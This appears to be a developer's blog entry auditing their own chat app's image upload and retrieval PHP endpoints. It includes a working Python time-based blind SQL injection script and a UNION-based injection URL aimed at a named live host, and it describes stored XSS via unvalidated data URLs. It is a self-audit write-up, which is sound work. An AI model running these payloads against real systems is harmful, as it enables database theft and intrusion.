    Today's gonna be a fun day!

    I'm digging into the image system today—the whole crappy little CDN I built (if you could call it that lol) in order to enable users to attach files to their messages. Only JPEGs and PNGs though!

    Or so I thought back then, I guess.

    I'm here to challenge that today—I'm gonna be ambitious and say that this image pipeline might be hiding our most severe findings yet.

    Or, of course, the code might just be so incompetent that it saves itself by accident. Already happened once lol, let's see.


    Ok, I thought we'd be dealing with four files in this one, but there are actually only two. There's a /image.php, /api/image.php, /imageget.php and finally /api/imageget.php, but it turns out that the files at / are quite literally the exact same as those in /api—zero diffs whatsoever. Nice! Makes my job easier.

    image.php is the file that inserts user images into the database; imageget.php is the one that retrieves them. We're dealing with the database again, so it's very possible that we find even more SQLi—but I'm more concerned at the fact that, if I don't have any input validation here either, we might be able to directly impact every damn user of the app.

    If simply existing in a chatroom can expose each and every user to potentially-very-malicious files, then that's genuinely a big problem.

    Let's start with image.php, see what kinda shenanigans we can get up to.

    First of all, what the hell is going on in that query?

    $query = "INSERT INTO images(bin, data) VALUES('".$data["bin"]."', '".json_encode(array_diff_key($data, ["bin"=>""]))."')";

    array_diff_key ??

    Oh, what? 😭

    Ok, so some context here—this is what the POST body would look like:

    {
    prefix: "data:image/jpeg;base64,", // or whatever the image prefix was
    data: "/9j/AAAABBBBCCCCDDDD...", // the base64 of the image (after we compress said image)
    bin: 1785264727529 // the unix timestamp of whenever that img was uploaded, as a unique identifier
}

    The whole array_diff_key($data, ["bin"=>""]) thing is literally just saying "give me all of data, but remove the 'bin' key." A nice little unset($data['bin']) somewhere would've done the exact same thing lol. Nah, I had to be fancy with it, I guess.

    Alright, so essentially the query is:

    INSERT INTO images(bin, data) VALUES(
    '1785264727529', -- or whatever the timestamp was
    '{"prefix": "data:image/jpeg;base64", "data": "/9j/AAAABBBBCCCCDDDD..." }'
)

    I'm seeing something really really fun there! Once again, we control the POST body. And once again, there's not a LICK of input validation. We don't even need to make a file polyglot lol, we can straight up just hand it a whole data URL and it'll plug it in for us. Maybe even a PHP file—I don't know whether the PHP in there would be executed or not, but it's ABSOLUTELY worth a shot. I guess it just depends on how these images are being rendered in the rooms. Let's have a look at that logic real quick:

    Now, there's one more thing quite wrong here, which is that that db query isn't being prepared. Look:

    $query = "INSERT INTO images(bin, data) VALUES('".$data["bin"]."', '".json_encode(array_diff_key($data, ["bin"=>""]))."')"

    So we can once again probably go time-based blind with that bin value since there's no input validation on that. I could probably take the script I wrote yesterday and fit it to this scenario. Gimme a sec.

    Ok, something like this:

    import requests
import string
import time

url = "https://parity.nimbusdigital.org/image.php"
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_.,-: ()+~"

print("Starting...")

result = ""
pos = 1

while True:
    found = False

    for c in chars:
        bin = f"{time.time()}', (SELECT CASE WHEN substring(version(),{pos},1)='{c}' THEN pg_sleep(3) ELSE pg_sleep(0) END))--"
        start = time.time()
        requests.post(url, json={"prefix": "any", "data": "any", "bin": bin})

        if (time.time() - start) >= 3: # over our time threshold; we got one
            result += c
            print(f"Char at position {pos} = '{c}' : {result}")
            found = True
            break

    if not found:
        break

    pos += 1

print(f"Done! Result: {result}")

    So the query would become:

    INSERT INTO images(bin, data) VALUES(/* current timestamp */, (SELECT CASE WHEN substring(version(),/* current pos */,1) = /* current char */ THEN pg_sleep(3) ELSE pg_sleep(0) END))

    Number of Findings Today: 2

    Moving onto imageget.php, the complement to image.php. It's really quite a simple file—all it does is:

    • Accepts a URL parameter bin
    • Queries the database for the row WHERE bin='".$_GET["bin"]."'"
    • Decodes the result as JSON and echoes the value of the prefix key concatenated to the value of the data key

    Of course it's SQLi-able. Of course. This one, in fact, may even be the most straightforward one yet! I say that because it's actually echoing out data from the query; if we can make the query itself return whatever we want, then we don't even need to go blind for this one!

    That query looks like this:

    "SELECT * FROM images WHERE bin='".$_GET["bin"]."'"

    And the return logic looks like this:

    $dsrc = json_decode($src["data"], true); // where $src is the query result
echo $dsrc["prefix"].$dsrc["data"];

    So, in theory, if we make that SELECT return a JSON string with keys for "prefix" and "data", the PHP file will echo their values.

    Just googled how the hell to do that—apparently postgres has great JSON support right out of the box! There's a whole thing called json_build_object('key1', 'val1', 'key2', 'val2'). Love that!

    Ok, so then I'm thinking something like:

    ' UNION SELECT NULL, CAST(json_build_object('prefix', '', 'data', version()) AS text) --

    So the full query becomes:

    SELECT * FROM images WHERE bin='' UNION SELECT NULL, CAST(json_build_object('prefix', '', 'data', version()) AS text) --

    So ideally, this builds a JSON object with an empty "prefix" key and a "data" key that has literally anything we want inside of it, and then the PHP will just write that out for us.

    Let's try visiting:

    https://parity.nimbusdigital.org/imageget.php?bin=' UNION SELECT NULL, CAST(json_build_object('prefix', '', 'data', version()) AS text) --

    Would. You. Look. At. THAT.

    Absolutely gorgeous. This one takes the cake. Swap out that version() call for whatever you want, and it'll happily do it for you.

    Well, well. Albeit shorter than the others, this was a pretty eventful session! Once again, here's what we found:

    • Stored XSS in the main chatrooms due to lack of input validation in image.php.
    • Time-based Blind SQLi in image.php via the "bin" parameter, once again because of lack of input validation.
    • The best, plainest SQLi vuln yet, found in imageget.php, using the "bin" URL parameter.

    We didn't find any file polyglot crap like I thought from the beginning—but honestly, with the trick we found in image.php, it might not even be necessary. Because you can upload whatever the hell you want anyway—you don't need to trick the app into letting you. Makes things a lot easier on the attacker side lol, I'll take it.

    I said earlier that I thought this session might be hiding our most severe findings yet—after the room-wide XSS, and that last SQLi in imageget.php, I think I was right.
